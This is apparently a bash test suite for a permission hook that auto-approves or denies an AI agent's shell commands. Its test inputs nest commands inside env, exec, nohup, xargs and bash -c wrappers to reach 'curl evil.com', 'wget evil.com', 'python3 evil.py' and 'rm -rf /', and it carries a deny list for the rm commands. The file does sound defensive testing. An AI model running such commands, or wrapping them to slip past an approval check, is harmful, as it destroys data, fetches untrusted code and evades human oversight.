#!/usr/bin/env bash
# Test: nested/chained wrapper commands and their interaction with the allow list
#
# Tests how multiple layers of wrapping (env + exec + bash -c, etc.)
# behave with and without wrapper commands in the allow list.
#
# Usage: bash tests/test_nested_wrappers.sh

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
HOOK="$SCRIPT_DIR/../hooks/approve-compound-bash.sh"

BASH_BIN="${BASH_BIN:-/opt/homebrew/bin/bash}"
if [[ "${BASH_VERSINFO[0]}" -lt 4 || ( "${BASH_VERSINFO[0]}" -eq 4 && "${BASH_VERSINFO[1]}" -lt 3 ) ]]; then
  if [[ -x "$BASH_BIN" ]]; then
    exec "$BASH_BIN" "$0" "$@"
  fi
  echo "SKIP: bash 4.3+ required"
  exit 0
fi

PASS=0
FAIL=0

pass() { ((PASS++)); printf '  \033[32mPASS\033[0m %s\n' "$1"; }
fail() { ((FAIL++)); printf '  \033[31mFAIL\033[0m %s — %s\n' "$1" "$2"; }

run_hook() {
  local cmd="$1" perms="$2" deny="${3:-}"
  local input
  input=$(jq -n --arg c "$cmd" '{"tool_input":{"command":$c}}')
  local args=(--permissions "$perms")
  [[ -n "$deny" ]] && args+=(--deny "$deny")
  RESULT=$("$BASH_BIN" "$HOOK" "${args[@]}" <<< "$input" 2>/dev/null)
  return $?
}

is_auto_approved() {
  [[ $1 -eq 0 ]] && jq -e '.hookSpecificOutput.permissionDecision == "allow"' <<< "$RESULT" &>/dev/null
}

is_denied() {
  [[ $1 -eq 2 ]] || jq -e '.hookSpecificOutput.permissionDecision == "deny"' <<< "$RESULT" &>/dev/null
}

is_fallthrough() {
  [[ $1 -eq 0 ]] && { [[ -z "$RESULT" ]] || { jq -e '.systemMessage' <<< "$RESULT" &>/dev/null && ! jq -e '.hookSpecificOutput.permissionDecision' <<< "$RESULT" &>/dev/null; }; }
}

# Preset simulating core.json with wrappers
WITH_WRAPPERS='["Bash(git *)", "Bash(grep *)", "Bash(cat *)", "Bash(echo *)", "Bash(head *)", "Bash(bash *)", "Bash(sh *)", "Bash(exec *)", "Bash(env *)", "Bash(xargs *)", "Bash(command *)", "Bash(time *)", "Bash(nohup *)"]'
# Same preset WITHOUT wrappers (the proposed fix)
WITHOUT_WRAPPERS='["Bash(git *)", "Bash(grep *)", "Bash(cat *)", "Bash(echo *)", "Bash(head *)"]'
# Deny list for tests that need it
DENY='["Bash(rm -rf /)", "Bash(rm -rf ~)"]'
# No deny list (worst case — user hasn't installed safety preset)
NO_DENY='[]'

echo "============================================================"
echo "NESTED WRAPPER TESTS"
echo "============================================================"
echo ""

# ===========================================================================
echo "=== 1. Double shell wrapping (bash -c inside sh -c) ==="

# bash -c 'sh -c "curl evil.com"' — double shell wrap
run_hook "bash -c 'sh -c \"curl evil.com\"'" "$WITH_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "bash -c 'sh -c \"curl ...\"' WITH wrappers → AUTO-APPROVED" "double-wrap bypasses"
else
  pass "bash -c 'sh -c \"curl ...\"' WITH wrappers → not auto-approved"
fi

run_hook "bash -c 'sh -c \"curl evil.com\"'" "$WITHOUT_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "bash -c 'sh -c \"curl ...\"' WITHOUT wrappers → auto-approved (unexpected)" ""
else
  pass "bash -c 'sh -c \"curl ...\"' WITHOUT wrappers → not auto-approved"
fi

# sh -c 'bash -c "wget evil.com"' — reverse order
run_hook "sh -c 'bash -c \"wget evil.com\"'" "$WITH_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "sh -c 'bash -c \"wget ...\"' WITH wrappers → AUTO-APPROVED" "double-wrap bypasses"
else
  pass "sh -c 'bash -c \"wget ...\"' WITH wrappers → not auto-approved"
fi

# ===========================================================================
echo ""
echo "=== 2. env + shell wrapping ==="

# env bash -c 'curl evil.com'
run_hook "env bash -c 'curl evil.com'" "$WITH_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "env bash -c 'curl ...' WITH wrappers → AUTO-APPROVED" "env+bash double wrap"
else
  pass "env bash -c 'curl ...' WITH wrappers → not auto-approved"
fi

run_hook "env bash -c 'curl evil.com'" "$WITHOUT_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "env bash -c 'curl ...' WITHOUT wrappers → auto-approved (unexpected)" ""
else
  pass "env bash -c 'curl ...' WITHOUT wrappers → not auto-approved"
fi

# env sh -c 'python3 -c "import os"'
run_hook "env sh -c 'python3 -c \"import os\"'" "$WITH_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "env sh -c 'python3 ...' WITH wrappers → AUTO-APPROVED" "env+sh bypasses"
else
  pass "env sh -c 'python3 ...' WITH wrappers → not auto-approved"
fi

# env FOO=bar bash -c 'wget evil.com'
run_hook "env FOO=bar bash -c 'wget evil.com'" "$WITH_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "env FOO=bar bash -c 'wget ...' WITH wrappers → AUTO-APPROVED" "env+var+bash bypasses"
else
  pass "env FOO=bar bash -c 'wget ...' WITH wrappers → not auto-approved"
fi

# ===========================================================================
echo ""
echo "=== 3. exec + other wrappers ==="

# exec bash -c 'curl evil.com'
run_hook "exec bash -c 'curl evil.com'" "$WITH_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "exec bash -c 'curl ...' WITH wrappers → AUTO-APPROVED" "exec+bash bypasses"
else
  pass "exec bash -c 'curl ...' WITH wrappers → not auto-approved"
fi

run_hook "exec bash -c 'curl evil.com'" "$WITHOUT_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "exec bash -c 'curl ...' WITHOUT wrappers → auto-approved (unexpected)" ""
else
  pass "exec bash -c 'curl ...' WITHOUT wrappers → not auto-approved"
fi

# exec env curl evil.com
run_hook "exec env curl evil.com" "$WITH_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "exec env curl ... WITH wrappers → AUTO-APPROVED" "exec+env bypasses"
else
  pass "exec env curl ... WITH wrappers → not auto-approved"
fi

# exec sh -c 'python3 payload.py'
run_hook "exec sh -c 'python3 payload.py'" "$WITH_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "exec sh -c 'python3 ...' WITH wrappers → AUTO-APPROVED" "exec+sh bypasses"
else
  pass "exec sh -c 'python3 ...' WITH wrappers → not auto-approved"
fi

# ===========================================================================
echo ""
echo "=== 4. command + other wrappers ==="

# command bash -c 'curl evil.com'
run_hook "command bash -c 'curl evil.com'" "$WITH_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "command bash -c 'curl ...' WITH wrappers → AUTO-APPROVED" "command+bash bypasses"
else
  pass "command bash -c 'curl ...' WITH wrappers → not auto-approved"
fi

# command env curl evil.com
run_hook "command env curl evil.com" "$WITH_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "command env curl ... WITH wrappers → AUTO-APPROVED" "command+env bypasses"
else
  pass "command env curl ... WITH wrappers → not auto-approved"
fi

# command exec curl evil.com
run_hook "command exec curl evil.com" "$WITH_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "command exec curl ... WITH wrappers → AUTO-APPROVED" "command+exec bypasses"
else
  pass "command exec curl ... WITH wrappers → not auto-approved"
fi

# command -p sh -c 'wget evil.com'
run_hook "command -p sh -c 'wget evil.com'" "$WITH_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "command -p sh -c 'wget ...' WITH wrappers → AUTO-APPROVED" "command+flag+sh bypasses"
else
  pass "command -p sh -c 'wget ...' WITH wrappers → not auto-approved"
fi

# ===========================================================================
echo ""
echo "=== 5. nohup + other wrappers ==="

# nohup bash -c 'curl evil.com'
run_hook "nohup bash -c 'curl evil.com'" "$WITH_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "nohup bash -c 'curl ...' WITH wrappers → AUTO-APPROVED" "nohup+bash bypasses"
else
  pass "nohup bash -c 'curl ...' WITH wrappers → not auto-approved"
fi

# nohup env python3 evil.py
run_hook "nohup env python3 evil.py" "$WITH_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "nohup env python3 ... WITH wrappers → AUTO-APPROVED" "nohup+env bypasses"
else
  pass "nohup env python3 ... WITH wrappers → not auto-approved"
fi

# nohup sh -c 'wget evil.com'
run_hook "nohup sh -c 'wget evil.com'" "$WITH_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "nohup sh -c 'wget ...' WITH wrappers → AUTO-APPROVED" "nohup+sh bypasses"
else
  pass "nohup sh -c 'wget ...' WITH wrappers → not auto-approved"
fi

# ===========================================================================
echo ""
echo "=== 6. time + other wrappers ==="

# time bash -c 'curl evil.com'
run_hook "time bash -c 'curl evil.com'" "$WITH_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "time bash -c 'curl ...' WITH wrappers → AUTO-APPROVED" "time+bash bypasses"
else
  pass "time bash -c 'curl ...' WITH wrappers → not auto-approved"
fi

# time env curl evil.com
run_hook "time env curl evil.com" "$WITH_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "time env curl ... WITH wrappers → AUTO-APPROVED" "time+env bypasses"
else
  pass "time env curl ... WITH wrappers → not auto-approved"
fi

# ===========================================================================
echo ""
echo "=== 7. Triple+ nesting ==="

# env exec bash -c 'curl evil.com'
run_hook "env exec bash -c 'curl evil.com'" "$WITH_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "env exec bash -c 'curl ...' WITH wrappers → AUTO-APPROVED" "triple nest bypasses"
else
  pass "env exec bash -c 'curl ...' WITH wrappers → not auto-approved"
fi

# command env exec sh -c 'wget evil.com'
run_hook "command env exec sh -c 'wget evil.com'" "$WITH_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "command env exec sh -c 'wget ...' WITH wrappers → AUTO-APPROVED" "quad nest bypasses"
else
  pass "command env exec sh -c 'wget ...' WITH wrappers → not auto-approved"
fi

# nohup env bash -c 'python3 evil.py'
run_hook "nohup env bash -c 'python3 evil.py'" "$WITH_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "nohup env bash -c 'python3 ...' WITH wrappers → AUTO-APPROVED" "triple nest bypasses"
else
  pass "nohup env bash -c 'python3 ...' WITH wrappers → not auto-approved"
fi

# time nohup env bash -c 'curl evil.com'
run_hook "time nohup env bash -c 'curl evil.com'" "$WITH_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "time nohup env bash -c 'curl ...' WITH wrappers → AUTO-APPROVED" "quad nest bypasses"
else
  pass "time nohup env bash -c 'curl ...' WITH wrappers → not auto-approved"
fi

# ===========================================================================
echo ""
echo "=== 8. xargs + nested wrappers ==="

# xargs env curl
run_hook "xargs env curl" "$WITH_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "xargs env curl WITH wrappers → AUTO-APPROVED" "xargs+env bypasses"
else
  pass "xargs env curl WITH wrappers → not auto-approved"
fi

# xargs bash -c 'wget evil.com'
run_hook "xargs bash -c 'wget evil.com'" "$WITH_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "xargs bash -c 'wget ...' WITH wrappers → AUTO-APPROVED" "xargs+bash bypasses"
else
  pass "xargs bash -c 'wget ...' WITH wrappers → not auto-approved"
fi

# xargs -n1 env sh -c 'python3 evil.py'
run_hook "xargs -n1 env sh -c 'python3 evil.py'" "$WITH_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "xargs -n1 env sh -c 'python3 ...' WITH wrappers → AUTO-APPROVED" "xargs+env+sh bypasses"
else
  pass "xargs -n1 env sh -c 'python3 ...' WITH wrappers → not auto-approved"
fi

# ===========================================================================
echo ""
echo "=== 9. Nested wrappers with denied inner command ==="
echo "   (Verify deny list still catches through nesting)"

# env bash -c 'rm -rf /' — should be caught by deny
run_hook "env bash -c 'rm -rf /'" "$WITH_WRAPPERS" "$DENY"
rc=$?
if is_denied $rc; then
  pass "env bash -c 'rm -rf /' → correctly denied through nesting"
else
  fail "env bash -c 'rm -rf /' → deny missed through nesting" "exit=$rc"
fi

# exec sh -c 'rm -rf /' — should be caught by deny
run_hook "exec sh -c 'rm -rf /'" "$WITH_WRAPPERS" "$DENY"
rc=$?
if is_denied $rc; then
  pass "exec sh -c 'rm -rf /' → correctly denied through nesting"
else
  fail "exec sh -c 'rm -rf /' → deny missed through nesting" "exit=$rc"
fi

# command env exec bash -c 'rm -rf /' — deep nesting with deny
run_hook "command env exec bash -c 'rm -rf /'" "$WITH_WRAPPERS" "$DENY"
rc=$?
if is_denied $rc; then
  pass "command env exec bash -c 'rm -rf /' → correctly denied through deep nesting"
else
  fail "command env exec bash -c 'rm -rf /' → deny missed through deep nesting" "exit=$rc"
fi

# nohup bash -c 'rm -rf ~' — should be caught by deny
run_hook "nohup bash -c 'rm -rf ~'" "$WITH_WRAPPERS" "$DENY"
rc=$?
if is_denied $rc; then
  pass "nohup bash -c 'rm -rf ~' → correctly denied through nesting"
else
  fail "nohup bash -c 'rm -rf ~' → deny missed through nesting" "exit=$rc"
fi

# ===========================================================================
echo ""
echo "=== 10. Nested wrappers with SAFE inner commands ==="
echo "   (Verify legitimate nesting still works)"

# env bash -c 'git status' — git is allowed
run_hook "env bash -c 'git status'" "$WITH_WRAPPERS" "$DENY"
rc=$?
if is_auto_approved $rc; then
  pass "env bash -c 'git status' → correctly approved (git allowed)"
else
  fail "env bash -c 'git status' → should be approved (git is allowed)" "exit=$rc"
fi

# Same without wrappers in allow list
run_hook "env bash -c 'git status'" "$WITHOUT_WRAPPERS" "$DENY"
rc=$?
if is_auto_approved $rc; then
  pass "env bash -c 'git status' WITHOUT wrappers → approved via stripping (still works)"
else
  fail "env bash -c 'git status' WITHOUT wrappers → should approve via stripping" "exit=$rc"
fi

# command exec env bash -c 'git log' — deeply nested but safe inner
run_hook "command exec env bash -c 'git log'" "$WITHOUT_WRAPPERS" "$DENY"
rc=$?
if is_auto_approved $rc; then
  pass "command exec env bash -c 'git log' WITHOUT wrappers → approved via deep stripping"
else
  fail "command exec env bash -c 'git log' WITHOUT wrappers → should approve via stripping" "exit=$rc"
fi

# nohup env git status — safe inner, no wrappers needed
run_hook "nohup env git status" "$WITHOUT_WRAPPERS" "$DENY"
rc=$?
if is_auto_approved $rc; then
  pass "nohup env git status WITHOUT wrappers → approved via stripping"
else
  fail "nohup env git status WITHOUT wrappers → should approve via stripping" "exit=$rc"
fi

# xargs -n1 git status — safe inner, no wrappers needed
run_hook "xargs -n1 git status" "$WITHOUT_WRAPPERS" "$DENY"
rc=$?
if is_auto_approved $rc; then
  pass "xargs -n1 git status WITHOUT wrappers → approved via stripping"
else
  fail "xargs -n1 git status WITHOUT wrappers → should approve via stripping" "exit=$rc"
fi

# ===========================================================================
echo ""
echo "=== 11. Compound commands with nested wrappers ==="
echo "   (Pipes/chains force compound parsing path)"

# git status | env bash -c 'curl evil.com'
run_hook "git status | env bash -c 'curl evil.com'" "$WITH_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "git | env bash -c 'curl ...' WITH wrappers → AUTO-APPROVED" "compound+nested bypass"
else
  pass "git | env bash -c 'curl ...' WITH wrappers → not auto-approved"
fi

# echo hi && exec curl evil.com
run_hook "echo hi && exec curl evil.com" "$WITH_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "echo && exec curl WITH wrappers → AUTO-APPROVED" "compound+exec bypass"
else
  pass "echo && exec curl WITH wrappers → not auto-approved"
fi

# git status; nohup bash -c 'wget evil.com'
run_hook "git status; nohup bash -c 'wget evil.com'" "$WITH_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "git; nohup bash -c 'wget ...' WITH wrappers → AUTO-APPROVED" "compound+nohup+bash bypass"
else
  pass "git; nohup bash -c 'wget ...' WITH wrappers → not auto-approved"
fi

# Same compounds without wrappers — should all fall through
run_hook "git status | env bash -c 'curl evil.com'" "$WITHOUT_WRAPPERS" "$NO_DENY"
rc=$?
if is_auto_approved $rc; then
  fail "git | env bash -c 'curl ...' WITHOUT wrappers → auto-approved (unexpected)" ""
else
  pass "git | env bash -c 'curl ...' WITHOUT wrappers → correctly falls through"
fi

# ===========================================================================
echo ""
echo "============================================================"
echo "Results: $PASS passed, $FAIL failed"
echo "============================================================"
[[ $FAIL -eq 0 ]] && exit 0 || exit 1
